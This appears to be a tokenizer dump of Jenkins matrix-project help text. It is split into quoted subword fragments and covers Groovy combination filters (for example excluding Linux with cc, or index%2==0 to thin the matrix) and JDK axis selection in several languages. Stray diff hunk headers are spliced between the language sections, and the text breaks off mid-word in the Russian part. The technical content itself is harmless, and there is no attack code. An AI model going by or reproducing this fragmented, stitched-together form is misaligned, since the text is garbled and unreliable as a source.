"</", "td", ">", "<", "td", ">", "<", "pre", ">", "(", "label", "=", "=\"", "solaris", "\"", ").", "implies", "(", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "table", ">", "<", "/", "center", ">", "<", "h4", ">", "Limitation", "de", "la", "matrice", "<", "/", "h4", ">", "<", "p", ">", "En", "plus", "des", "r", "\u00e8", "gles", "de", "filtrage", "bas", "\u00e9", "es", "sur", "les", "valeurs", ",", "on", "peut", "\u00e9", "galement", "utiliser", "une", "variable", "sp", "\u00e9", "ciale", "\"", "<", "tt", ">", "index", "<", "/", "tt", ">", "\"", "qui", "peut", "\u00ea", "tre", "utilis", "\u00e9", "e", "pour", "diminuer", "la", "matrice", ".", "<", "p", ">", "Par", "exemple", ",", "<", "tt", ">", "index", "%", "2", "=", "=", "0", "<", "/", "tt", ">", "diminuerait", "la", "matrice", "de", "moiti", "\u00e9", "en", "retirant", "1", "combinaison", "sur", "2", ",", "de", "fa", "\u00e7", "on", "\u00e0", "ce", "que", "la", "couverture", "reste", "raisonnable", ".", "De", "m", "\u00ea", "me", ",", "<", "tt", ">", "index", "%", "3", "!", "=", "0", "<", "/", "tt", ">", "r", "\u00e9", "duirait", "la", "matrice", "\u00e0", "66", "%", "en", "supprimant", "1", "combinaison", "sur", "3", ".", "<", "/", "div", ">", "<", "div", ">", "\u30c7", "\u30d5\u30a9", "\u30eb\u30c8", "\u3067\u3001", "Jenkins", "\u306f", "\u69cb\u6210", "\u8ef8\u306e", "\u3059\u3079", "\u3066\u306e", "\u7d44\u307f", "\u5408\u308f", "\u305b\u3092", "\u30d3\u30eb", "\u30c9\u3057", "\u307e\u3059", "\u3002\u3057", "\u304b\u3057", "\u3001\u5834", "\u5408\u306b", "\u3088\u3063", "\u3066\u306f", "\u3053\u308c", "\u3067\u306f", "\u7d44\u307f", "\u5408\u308f", "\u305b\u304c", "\u591a\u3059", "\u304e\u308b", "\u304b\u3001", "\u671b", "\u307e\u3057", "\u304f\u306a", "\u3044\u7d44", "\u307f\u5408", "\u308f\u305b", "\u304c\u3067", "\u304d\u3066", "\u3057\u307e", "\u3046\u3053", "\u3068\u304c", "\u3042\u308a", "\u307e\u3059", "\u3002", "\u305d", "\u306e\u3088", "\u3046\u306a", "\u5834\u5408", "\u3001\u771f", "\u507d\u5024", "\u3092\u8fd4", "\u3059", "Groovy", "\u306e", "\u5f0f\u3067", "\u5fc5\u8981", "\u306e\u306a", "\u3044\u7d44", "\u307f\u5408", "\u308f\u305b", "\u3092\u30d5", "\u30a3\u30eb", "\u30bf\u30ea", "\u30f3\u30b0", "\u3059\u308b", "\u4e8b\u3067", "\u3001\u69cb", "\u6210\u30de", "\u30c8\u30ea", "\u30c3\u30af", "\u30b9\u3092", "\u307e\u3070", "\u3089\u306b", "\u3059\u308b", "\u3053\u3068", "\u304c\u3067", "\u304d\u307e", "\u3059\u3002", "<", "p", ">", "Groovy", "\u306e", "\u5f0f\u3092", "\u3053\u3053", "\u3067\u6307", "\u5b9a\u3059", "\u308b\u3068", "\u3001\u5f0f", "\u306e\u7d50", "\u679c\u304c", "<", "b", ">", "true", "<", "/", "b", ">", "\u306b\u306a", "\u308b\u7d44", "\u307f\u5408", "\u308f\u305b", "\u306e\u307f", "\u30d3\u30eb", "\u30c9\u3055", "\u308c\u307e", "\u3059\u3002", "\u5f0f", "\u306e\u8a55", "\u4fa1\u3067", "\u306f\u3001", "\u8ef8\u306f", "\u5909\u6570", "\u3068\u3057", "\u3066\u6271", "\u308f\u308c", "\u307e\u3059", "(\u8a55", "\u4fa1\u4e2d", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u306b\u5024", "\u3092\u30bb", "\u30c3\u30c8", "\u3057\u307e", "\u3059)", "\u3002", "<", "h4", ">", "\u5024\u306b", "\u3088\u308b", "\u30d5\u30a3", "\u30eb\u30bf", "\u30ea\u30f3", "\u30b0<", "/", "h4", ">", "<", "p", ">", "\u4f8b", "\u3048\u3070", "\u3001\u7570", "\u306a\u308b", "OS", "\u4e0a", "\u3067\u8907", "\u6570\u306e", "\u30b3\u30f3", "\u30d1\u30a4", "\u30e9\u3092", "\u4f7f\u7528", "\u3057\u3066", "\u30d3\u30eb", "\u30c9\u3059", "\u308b\u3053", "\u3068\u3092", "\u8003\u3048", "\u3066\u307f", "\u307e\u3057", "\u3087\u3046", "\u3002", "\u30b9", "\u30ec\u30fc", "\u30d6\u306e", "\u30e9\u30d9", "\u30eb\u306f", "<", "b", ">", "label", "=", "[", "linux", ",", "solaris", "]", "</", "b", ">", "\u3068\u3057", "\u3001<", "b", ">", "compiler", "=", "[", "gcc", ",", "cc", "]", "</", "b", ">", "\u3068\u3044", "\u3046\u69cb", "\u6210\u8ef8", "\u3092\u4f5c", "\u6210\u3057", "\u305f\u3068", "\u3057\u307e", "\u3059\u3002", "\u6b21", "\u306e\u5f0f", "\u306f\u3001", "\u3069\u308c", "\u3082<", "b", ">", "linux", "<", "/", "b", ">", "\u4e0a\u3067", "\u306e<", "b", ">", "cc", "<", "/", "b", ">", "\u306b\u3088", "\u308b\u30d3", "\u30eb\u30c9", "\u3092\u9664", "\u53bb\u3057", "\u307e\u3059", "\u3002", "\u3053", "\u306e\u5236", "\u7d04\u3092", "\u3069\u3046", "\u8003\u3048", "\u308b\u304b", "\u306b\u3082", "\u3088\u3063", "\u3066\u3001", "\u3069\u306e", "\u5f0f\u304c", "\u671b\u307e", "\u3057\u3044", "\u3068\u601d", "\u3046\u304b", "\u306f\u500b", "\u4eba\u5dee", "\u304c\u3042", "\u308b\u3067", "\u3057\u3087", "\u3046\u3002", "<", "center", ">", "<", "table", ">", "<", "tr", ">", "<", "td", ">", "\"", "linux", "\u3068", "cc", "\u306e", "\u5834\u5408", "\u306f\u7121", "\u52b9\"", "</", "td", ">", "<", "td", ">", "<", "pre", ">", "!(", "label", "=", "=\"", "linux", "\"", "&", "&", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "\"", "solaris", "\u304b", "gcc", "\u306e", "\u5834\u5408", "\u306f\u6709", "\u52b9\"", "</", "td", ">", "<", "td", ">", "<", "pre", ">", "label", "=", "=\"", "solaris", "\"", "|", "|", "compiler", "=", "=\"", "gcc", "\"", "</", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "\"", "solaris", "\u3067", "\u3042\u308c", "\u3070", "cc", "\u306e", "\u307f\u4f7f", "\u7528\u3059", "\u308b\"", "</", "td", ">", "<", "td", ">", "<", "pre", ">", "(", "label", "=", "=\"", "solaris", "\"", ").", "implies", "(", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "table", ">", "<", "/", "center", ">", "<", "h4", ">", "\u307e\u3070", "\u3089\u306a", "\u884c\u5217", "\u3092\u4f5c", "\u308b<", "/", "h4", ">", "<", "p", ">", "\u7279", "\u5b9a\u306e", "\u5024\u306e", "\u7d44\u307f", "\u5408\u308f", "\u305b\u306e", "\u9664\u53bb", "\u306b\u52a0", "\u3048\u3066", "\u3001\u4e88", "\u7d04\u3055", "\u308c\u305f", "<", "tt", ">", "index", "<", "/", "tt", ">", "\u5909\u6570", "\u3092\u4f7f", "\u3063\u3066", "\u884c\u5217", "\u3092\u4e00", "\u69d8\u306b", "\u307e\u3070", "\u3089\u306b", "\u3059\u308b", "\u3053\u3068", "\u304c\u3067", "\u304d\u307e", "\u3059\u3002", "<", "p", ">", "\u4f8b", "\u3048\u3070", "\u3001<", "tt", ">", "index", "%", "2", "=", "=", "0", "<", "/", "tt", ">", "\u3068\u3059", "\u308b\u3068", "\u3001\uff12", "\u3064\u306b", "\uff11\u3064", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u3092\u9664", "\u53bb\u3059", "\u308b\u3053", "\u3068\u3067", "\u3001\u30d3", "\u30eb\u30c9", "\u3059\u308b", "\u7d44\u307f", "\u5408\u308f", "\u305b\u306e", "\u30b5\u30a4", "\u30ba\u3092", "\u534a\u5206", "\u306b", "\u3059", "\u308b\u3053", "\u3068\u304c", "\u3067\u304d", "\u307e\u3059", "\u3002\u540c", "\u69d8\u306b", "\u3001<", "tt", ">", "index", "%", "3", "!", "=", "0", "<", "/", "tt", ">", "\u3068\u3059", "\u308b\u3068", "\u3001\uff13", "\u3064\u306b", "\uff11\u3064", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u304c\u9664", "\u53bb\u3055", "\u308c\u30b5", "\u30a4\u30ba", "\u306f", "66", "%", "\u306b\u306a", "\u308a\u307e", "\u3059\u3002", "index", "\u306e", "\u5024\u306f", "\u3001\u5270", "\u4f59\u8a08", "\u7b97\u306b", "\u304a\u3044", "\u3066\u30d3", "\u30eb\u30c9", "\u304c\u7279", "\u5b9a\u306e", "\u5024\u306b", "\u504f\u3089", "\u306a\u3044", "\u3088\u3046", "\u306b\u8a08", "\u7b97\u3055", "\u308c\u307e", "\u3059\u3002", "<", "/", "div", ">", "@", "@", "-", "1", ",", "47", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Jenkins", "\u9810", "\u8a2d\u6703", "\u5efa\u7f6e", "\u6240\u6709", "\u8ef8\u7dda", "\u53ef\u80fd", "\u7684\u6392", "\u5217\u7d44", "\u5408\u3002", "\u4e0d\u904e", "\u6709\u6642", "\u5019\u7d44", "\u5408\u6703", "\u904e\u591a", "\uff0c\u6216", "\u662f\u6709", "\u4e9b\u7d44", "\u5408\u6839", "\u672c\u5c31", "\u4e0d\u5408", "\u7406\u3002", "\u9019", "\u7a2e\u60c5", "\u6cc1\u4e0b", "\uff0c\u60a8", "\u53ef\u4ee5", "\u4f7f\u7528", "Groovy", "\u8868", "\u793a\u5f0f", "\u56de\u50b3", "\u503c\u904e", "\u6ffe\u6389", "\u4e0d\u8981", "\u7684\u7d44", "\u5408\uff0c", "\u8b93\u77e9", "\u9663\u7a00", "\u758f\u9ede", "\u3002", "<", "p", ">", "\u8a2d", "\u5b9a\u4e86", "Groovy", "\u8868", "\u793a\u5f0f", "\u5f8c\uff0c", "\u53ea\u6709", "\u56de\u50b3", "\u7d50\u679c", "\u662f", "<", "b", ">", "true", "<", "/", "b", ">", "\u7684", "\u7d44\u5408", "\u624d\u6703", "\u5efa\u7f6e", "\u3002", "\u8868", "\u793a\u5f0f", "\u57f7\u884c", "\u6642\uff0c", "\u8ef8\u7dda", "\u503c\u6703", "\u88ab\u7576", "\u505a\u8b8a", "\u6578\u50b3", "\u5165", "(", "\u8b8a\u6578", "\u503c\u8a2d", "\u6210\u7576", "\u4e0b\u8981", "\u5224\u65b7", "\u7684\u7d44", "\u5408)", "\u3002", "<", "h4", ">", "\u4f9d\u8b8a", "\u6578\u503c", "\u7be9\u9078", "</", "h4", ">", "<", "p", ">", "\u5047", "\u8a2d\u60a8", "\u8981\u5728", "\u4e0d\u540c", "\u4f5c\u696d", "\u7cfb\u7d71", "\u7684\u4e0d", "\u540c\u7de8", "\u8b6f\u5668", "\u4e0a\u5efa", "\u7f6e\u3002", "\u800c", "\u60a8\u7684", "Slave", "\u6a19", "\u7c64\u6709", "<", "b", ">", "label", "=", "[", "linux", ",", "solaris", "]", "</", "b", ">", "\uff0c\u4e26", "\u5efa\u4e86", "<", "b", ">", "compiler", "=", "[", "gcc", ",", "cc", "]", "</", "b", ">", "\u9019", "\u500b\u8ef8", "\u7dda\u3002", "\u4e0b", "\u5217\u7684", "\u6bcf\u4e00", "\u500b\u8868", "\u5f0f\u793a", "\u90fd\u6703", "\u904e\u6ffe", "\u6389\u5728", "<", "b", ">", "linux", "<", "/", "b", ">", "\u4e0a", "\u7684", "<", "b", ">", "cc", "<", "/", "b", ">", "\u5efa", "\u7f6e\u3002", "\u5dee", "\u5225\u5728", "\u60a8\u600e", "\u9ebc\u770b", "\u5f85\u9019", "\u500b\u9650", "\u5236\uff0c", "\u60a8\u53ef", "\u80fd\u6703", "\u89ba\u5f97", "\u67d0\u4e9b", "\u65b9\u5f0f", "\u5c31\u662f", "\u6bd4\u8f03", "\u76f4\u89c0", "\u3002", "<", "center", ">", "<", "table", ">", "<", "tr", ">", "<", "td", ">", "\u8b80\u4f5c", "\u300c\u540c", "\u6642\u662f", "Linux", "\u8ddf", "cc", "\u6642", "\uff0c\u5c31", "\u4e0d\u8981", "\u505a\u300d", "\u3002<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "!(", "label", "=", "=\"", "linux", "\"", "&", "amp", ";", "&", "amp", ";", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "\u8b80\u4f5c", "\u300c\u4e00", "\u5b9a\u8981", "\u5728", "Solaris", "\u4e0a", "\u6216\u662f", "\u7528", "gcc", "\u624d", "\u7b97\u662f", "\u6709\u6548", "\u7684\u7d44", "\u5408\u300d", "\u3002<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "label", "=", "=\"", "solaris", "\"", "|", "|", "compiler", "=", "=\"", "gcc", "\"", "</", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "\u8b80\u4f5c", "\u300c\u5728", "Solaris", "\u4e0a", "\uff0c\u53ea", "\u7528", "cc", "\u300d", "\u3002<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "(", "label", "=", "=\"", "solaris", "\"", ").", "implies", "(", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "table", ">", "<", "/", "center", ">", "<", "h4", ">", "\u77e9\u9663", "\u7a00\u758f", "\u5316<", "/", "h4", ">", "<", "p", ">", "\u9664", "\u4e86\u8a2d", "\u5b9a\u8b8a", "\u6578\u503c", "\u7be9\u9078", "\u898f\u5247", "\u5916\uff0c", "\u60a8\u4e5f", "\u53ef\u4ee5", "\u4f7f\u7528", "\"", "<", "code", ">", "index", "<", "/", "code", ">", "\"", "\u7279", "\u5225\u8b8a", "\u6578\uff0c", "\u5c07\u77e9", "\u9663\u7a00", "\u758f\u5316", "\u3002", "<", "p", ">", "\u4f8b", "\u5982", "<", "code", ">", "index", "%", "2", "=", "=", "0", "<", "/", "code", ">", "\u53ef", "\u4ee5\u8df3", "\u904e\u4e00", "\u7a2e\u7d44", "\u5408\u5f8c", "\u518d\u6311", "\u4e00\u7a2e", "\uff0c\u8b93", "\u77e9\u9663", "\u5927\u5c0f", "\u6e1b\u534a", "\uff0c\u9019", "\u7a2e\u6db5", "\u84cb\u7387", "\u4e5f\u5f88", "\u5408\u5e38", "\u7406\u3002", "\u540c", "\u6a23\u7684", "\uff0c<", "code", ">", "index", "%", "3", "!", "=", "0", "<", "/", "code", ">", "\u6703", "\u6bcf\u4e09", "\u7a2e\u7d44", "\u5408\u5c31", "\u6311\u4e00", "\u500b\u6389", "\uff0c\u8b93", "\u77e9\u9663", "\u7e2e\u5c0f", "\u4e09\u5206", "\u4e4b\u4e00", "\u3002", "<", "/", "div", ">", "<", "div", ">", "Specify", "the", "JDK", "(", "s", ")", "with", "which", "builds", "are", "performed", ".", "If", "none", "is", "selected", ",", "the", "default", "JDK", "is", "used", "(", "no", "explicit", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", ",", "and", "<", "tt", ">", "java", "<", "/", "tt", ">", "command", "is", "assumed", "to", "be", "in", "<", "tt", ">", "PATH", "<", "/", "tt", ">", ".)", "If", "multiple", "JDKs", "are", "selected", ",", "the", "configuration", "matrix", "will", "include", "all", "of", "the", "specified", "JDKs", ".", "<", "br", ">", "Selecting", "multiple", "values", "is", "typically", "useful", "when", "this", "job", "is", "running", "tests", ",", "and", "you", "need", "to", "run", "tests", "on", "multiple", "different", "versions", "of", "JDKs", ".", "<", "br", ">", "During", "a", "build", ",", "the", "selected", "JDK", "value", "for", "the", "given", "run", "is", "available", "as", "the", "\"", "jdk", "\"", "axis", ".", "See", "the", "help", "of", "\"", "axes", "\"", "below", "for", "more", "information", "about", "how", "to", "access", "the", "axis", "value", ".", "<", "/", "div", ">", "<", "div", ">", "Geben", "Sie", "die", "JDK", "(", "s", ")", "an", ",", "mit", "denen", "die", "Unter", "-", "Builds", "durchgef", "\u00fc", "hrt", "werden", "sollen", ".", "Wenn", "kein", "JDK", "ausgew", "\u00e4", "hlt", "ist", ",", "wird", "das", "Default", "-", "JDK", "verwendet", "(", "kein", "explizites", "Setzen", "der", "Umgebungsvariable", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", ";", "es", "wird", "erwartet", ",", "dass", "die", "Kommandozeilenanwendung", "<", "tt", ">", "java", "<", "/", "tt", ">", "im", "Suchpfad", "<", "tt", ">", "PATH", "<", "/", "tt", ">", "enthalten", "ist", ")", ".", "Wenn", "mehrere", "JDKs", "ausgew", "\u00e4", "hlt", "sind", ",", "deckt", "die", "Konfigurationsmatrix", "alle", "diese", "JDKs", "ab", ".", "<", "p", ">", "Eine", "Mehrfachauswahl", "ist", "typischerweise", "dann", "n", "\u00fc", "tzlich", ",", "wenn", "dieser", "Job", "Tests", "beinhaltet", "und", "Sie", "diese", "Tests", "mit", "unterschiedlichen", "JDKs", "ausf", "\u00fc", "hren", "m", "\u00f6", "chten", ".", "<", "p", ">", "W", "\u00e4", "hrend", "eines", "Builds", "ist", "das", "aktuelle", "JDK", "als", "Achse", "<", "tt", ">", "jdk", "<", "/", "tt", ">", "sichtbar", ".", "Im", "Hilfetext", "zu", "\"", "Achsen", "\"", "finden", "Sie", "weitere", "Informationen", ",", "wie", "Sie", "auf", "die", "Werte", "der", "Achsenvariablen", "zugreifen", "k", "\u00f6", "nnen", ".", "<", "/", "div", ">", "\ufeff", "<", "div", ">", "Sp", "\u00e9", "cifie", "le", "(", "s", ")", "JDK", "avec", "le", "(", "s", ")", "quel", "(", "s", ")", "les", "builds", "seront", "ex", "\u00e9", "cut", "\u00e9", "s", ".", "Si", "aucun", "n", "'", "est", "donn", "\u00e9", ",", "le", "JDK", "par", "d", "\u00e9", "faut", "est", "utilis", "\u00e9", "(", "pas", "de", "variable", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", "explicite", ";", "on", "suppose", "que", "la", "commande", "<", "tt", ">", "java", "<", "/", "tt", ">", "est", "dans", "le", "<", "tt", ">", "PATH", "<", "/", "tt", ">", ").", "Si", "de", "multiples", "JDK", "sont", "pr", "\u00e9", "cis", "\u00e9", "s", ",", "la", "matrice", "de", "configuration", "incluera", "tous", "ces", "JDK", ".", "<", "br", ">", "Avoir", "de", "multiples", "valeurs", "est", "utile", "typiquement", "quand", "le", "job", "ex", "\u00e9", "cute", "des", "tests", "et", "que", "vous", "devez", "les", "lancer", "sur", "plusieurs", "versions", "diff", "\u00e9", "rentes", "du", "JDK", ".", "<", "br", ">", "Au", "cours", "d", "'", "un", "build", ",", "le", "JDK", "s", "\u00e9", "lectionn", "\u00e9", "est", "visible", "dans", "l", "'", "axe", "'", "jdk", "'", ".", "R", "\u00e9", "f", "\u00e9", "rez", "-", "vous", "\u00e0", "l", "'", "aide", "sur", "les", "'", "axes", "'", "ci", "-", "dessous", "pour", "plus", "d", "'", "information", "sur", "l", "'", "acc", "\u00e8", "s", "\u00e0", "la", "valeur", "d", "'", "un", "axe", ".", "<", "/", "div", ">", "<", "div", ">", "\u30d3", "\u30eb\u30c9", "\u3092\u5b9f", "\u884c\u3059", "\u308b", "JDK", "\u3092", "\u6307\u5b9a", "\u3057\u307e", "\u3059\u3002", "\u6307\u5b9a", "\u3057\u306a", "\u3051\u308c", "\u3070\u3001", "\u30c7", "\u30d5\u30a9", "\u30eb\u30c8", "\u306e", "JDK", "\u3092", "\u4f7f\u7528", "\u3057\u307e", "\u3059(", "\u660e\u793a", "\u7684\u306b", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", "\u306f\u3057", "\u307e\u305b", "\u3093\u3057", "\u3001<", "tt", ">", "java", "<", "/", "tt", ">", "\u30b3\u30de", "\u30f3\u30c9", "\u306f\u30d1", "\u30b9\u306b", "\u8a2d\u5b9a", "\u3055\u308c", "\u3066\u3044", "\u308b\u3068", "\u60f3\u5b9a", "\u3057\u307e", "\u3059)", "\u3002", "\u8907", "\u6570\u306e", "JDK", "\u3092", "\u6307\u5b9a", "\u3057\u305f", "\u5834\u5408", "\u3001\u69cb", "\u6210\u8ef8", "\u306f\u6307", "\u5b9a\u3057", "\u305f\u5168", "\u3066\u306e", "JDK", "\u3092", "\u542b\u307f", "\u307e\u3059", "\u3002", "<", "br", ">", "\u30b8", "\u30e7\u30d6", "\u304c\u30c6", "\u30b9\u30c8", "\u3092\u5b9f", "\u884c\u3059", "\u308b\u5834", "\u5408\u3084", "\u3001\u7570", "\u306a\u308b", "\u30d0\u30fc", "\u30b8\u30e7", "\u30f3\u306e", "JDK", "\u3067", "\u30c6\u30b9", "\u30c8\u3059", "\u308b\u5fc5", "\u8981\u304c", "\u3042\u308b", "\u5834\u5408", "\u306b\u3001", "\u8907\u6570", "\u306e\u5024", "\u306e\u9078", "\u629e\u306f", "\u4fbf\u5229", "\u3067\u3059", "\u3002", "<", "br", ">", "\u6307", "\u5b9a\u3055", "\u308c\u305f", "JDK", "\u306e", "\u5024\u306f", "\u3001\u30d3", "\u30eb\u30c9", "\u4e2d\u306f", "\"", "jdk", "\"", "\u3068\u3044", "\u3046\u8ef8", "\u3068\u3057", "\u3066\u5229", "\u7528\u53ef", "\u80fd\u3067", "\u3059\u3002", "\u8ef8", "\u306e\u5024", "\u306e\u30a2", "\u30af\u30bb", "\u30b9\u65b9", "\u6cd5\u306e", "\u8a73\u7d30", "\u306b\u3064", "\u3044\u3066", "\u306f\u3001", "\"\u69cb", "\u6210\u8ef8", "\"\u306e", "\u30d8\u30eb", "\u30d7\u3092", "\u53c2\u7167", "\u3057\u3066", "\u304f\u3060", "\u3055\u3044", "\u3002", "<", "/", "div", ">", "<", "div", ">", "Geef", "uw", "JDK", "(", "s", ")", "op", "waarmee", "U", "uw", "bouwpoging", "wenst", "te", "lanceren", ".", "Indien", "U", "ervoor", "kiest", "geen", "specifieke", "JDK", "(", "s", ")", "op", "te", "geven", ",", "zal", "de", "standaard", "JDK", "gebruikt", "worden", ".", "Hierbij", "wordt", "er", "vanuit", "gegaan", "dat", "er", "geen", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", "gedefinieerd", "werd", "en", "dat", "het", "<", "tt", ">", "java", "<", "/", "tt", ">", "commando", "niet", "op", "uw", "<", "tt", ">", "PATH", "<", "/", "tt", ">", "aanwezig", "is", ".", "Indien", "U", "meerdere", "JDKs", "selecteert", ",", "zal", "uw", "matrixconfiguratie", "al", "deze", "omvatten", ".", "<", "br", ">", "Meerdere", "waarden", "zijn", "typisch", "nuttig", "wanneer", "een", "job", "onder", "meerdere", "JDKs", "getest", "dient", "te", "worden", ".", "<", "br", ">", "Gedurende", "uw", "bouwpoging", "is", "de", "gekozen", "versie", "van", "de", "JDK", "beschikbaar", "als", "de", "\"", "jdk", "\"", "-", "dimensie", ".", "Zie", "de", "hulpagina", "over", "dimensies", "voor", "meer", "informatie", "over", "het", "gebruik", "van", "dimensies", ".", "<", "/", "div", ">", "<", "div", ">", "Especifica", "a", "(", "s", ")", "JDK", "(", "s", ")", "com", "as", "quais", "as", "constru", "&", "#", "231", ";", "&#", "245", ";", "es", "s", "&", "#", "227", ";", "o", "executadas", ".", "Se", "nenhuma", "for", "selecionada", ",", "a", "JDK", "padr", "&", "#", "227", ";", "o", "&", "#", "233", ";", "usada", "(", "sem", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", "expl", "&", "#", "237", ";", "cito", ",", "e", "o", "comando", "<", "tt", ">", "java", "<", "/", "tt", ">", "&", "#", "233", ";", "assumido", "que", "est", "&", "#", "225", ";", "no", "<", "tt", ">", "PATH", "<", "/", "tt", ">", ".)", "Se", "m", "&", "#", "250", ";", "ltiploas", "JDKs", "forem", "selecionadas", ",", "a", "matriz", "de", "configura", "&", "#", "231", ";", "&#", "227", ";", "o", "incluir", "&", "#", "225", ";", "todos", "as", "JDKs", "especificadas", ".", "<", "br", ">", "Selecionar", "valores", "m", "&", "#", "250", ";", "ltiplos", "&", "#", "233", ";", "tipicamente", "&", "#", "250", ";", "til", "quando", "a", "tarefa", "for", "executar", "teste", ",", "e", "voc", "&", "#", "234", ";", "precisar", "executar", "testes", "em", "m", "&", "#", "250", ";", "ltiplas", "vers", "&", "#", "245", ";", "es", "diferentes", "de", "JDKs", ".", "<", "br", ">", "Durante", "uma", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", ",", "o", "valor", "de", "JDK", "selecionado", "para", "a", "execu", "&", "#", "231", ";", "&#", "227", ";", "o", "est", "&", "#", "225", ";", "dispon", "&", "#", "237", ";", "vel", "como", "o", "eixo", "\"", "jdK", "\"", ".", "Veja", "a", "ajuda", "de", "\"", "eixos", "\"", "abaixo", "para", "mais", "informa", "&", "#", "231", ";", "&#", "245", ";", "es", "sobre", "como", "acessar", "o", "valor", "do", "eixo", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "13", "+", "0", ",", "0", "@", "@", "\ufeff", "<", "div", ">", "\u0412", "\u044b\u0431", "\u0435\u0440", "\u0438\u0442", "\u0435", "JDK", "\u0441", "\u043a", "\u043e\u0442", "\u043e\u0440", "\u044b\u043c", "(\u0438", ")", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0432", "\u044b\u043f", "\u043e\u043b", "\u043d\u044f", "\u0442\u044c", "\u0441\u044f", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0430.", "\u0415", "\u0441\u043b", "\u0438", "\u043d", "\u0438", "\u043e", "\u0434\u043d", "\u043e\u0433", "\u043e", "\u043d", "\u0435", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043e", ",", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0438", "\u0441\u043f", "\u043e\u043b", "\u044c\u0437", "\u043e\u0432", "\u0430\u043d", "JDK", "\u043f", "\u043e-", "\u0443\u043c", "\u043e\u043b", "\u0447\u0430", "\u043d\u0438", "\u044e", "(", "\u0431\u0435", "\u0437", "\u044f", "\u0432\u043d", "\u043e\u0433", "\u043e", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", ",", "\u0438", "\u043a", "\u043e\u043c", "\u0430\u043d", "\u0434\u044b", "<", "tt", ">", "java", "<", "/", "tt", ">", "\u043d", "\u0435", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0443", "\u043a\u0430", "\u0437\u0430", "\u043d\u043e", "\u0432", "<", "tt", ">", "PATH", "<", "/", "tt", ">", ").", "\u0415", "\u0441\u043b", "\u0438", "\u043d", "\u0435\u0441", "\u043a\u043e", "\u043b\u044c", "\u043a\u043e", "JDK", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043e", ",", "\u043a", "\u043e\u043d", "\u0444\u0438", "\u0433\u0443", "\u0440\u0430", "\u0446\u0438", "\u043e\u043d", "\u043d\u0430", "\u044f", "\u043c", "\u0430\u0442", "\u0440\u0438", "\u0446\u0430", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0441", "\u043e\u0434", "\u0435\u0440", "\u0436\u0430", "\u0442\u044c", "\u0432", "\u0441\u0435", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043d", "\u044b\u0435", "JDK", ".", "<", "br", ">", "\u0412", "\u044b\u0431", "\u043e\u0440", "\u043d", "\u0435\u0441", "\u043a\u043e", "\u043b\u044c", "\u043a\u0438", "\u0445", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u0439", "\u043e", "\u0431\u044b", "\u0447\u043d", "\u043e", "\u043f", "\u043e\u043b", "\u0435\u0437", "\u0435\u043d", "\u0432", "\u0441", "\u043b\u0443", "\u0447\u0430", "\u044f\u0445", "\u043a", "\u043e\u0433", "\u0434\u0430", "\u043f", "\u0440\u043e", "\u0435\u043a", "\u0442", "\u0442", "\u0435\u0441", "\u0442\u0438", "\u0440\u0443", "\u0435\u0442", "\u0441\u044f", "\u0438", "\u0432", "\u0430\u043c", "\u043d", "\u0443\u0436", "\u043d\u043e", "\u0437", "\u0430\u043f", "\u0443\u0441", "\u043a\u0430", "\u0442\u044c", "\u0442", "\u0435\u0441", "\u0442\u044b", "\u043d", "\u0430", "\u043d", "\u0435\u0441", "\u043a\u043e", "\u043b\u044c", "\u043a\u0438", "\u0445", "\u0440", "\u0430\u0437", "\u043d\u044b", "\u0445", "\u0432", "\u0435\u0440", "\u0441\u0438", "\u044f\u0445", "JDK", ".", "<", "br", ">", "\u0412", "\u043e", "\u0432", "\u0440\u0435", "\u043c\u044f", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0438", "\u0432", "\u044b\u0431", "\u0440\u0430", "\u043d\u043d", "\u043e\u0435", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u0435", "JDK", "\u0434", "\u043e\u0441", "\u0442\u0443", "\u043f\u043d", "\u043e", "\u043a", "\u0430\u043a", "\u043e", "\u0441\u044c", "\"", "jdk", "\"", ".", "\u0421", "\u043c\u043e", "\u0442\u0440", "\u0438\u0442", "\u0435", "\u0432", "\u043f", "\u043e\u0434", "\u0441\u043a", "\u0430\u0437", "\u043a\u0443", "\u043a", "\u043e", "\u043f\u0446", "\u0438\u0438", "\"", "\u041e\u0441", "\u0438", "(", "axes", ")", "\"", "\u043d", "\u0438\u0436", "\u0435", "\u0434", "\u043b\u044f", "\u043f", 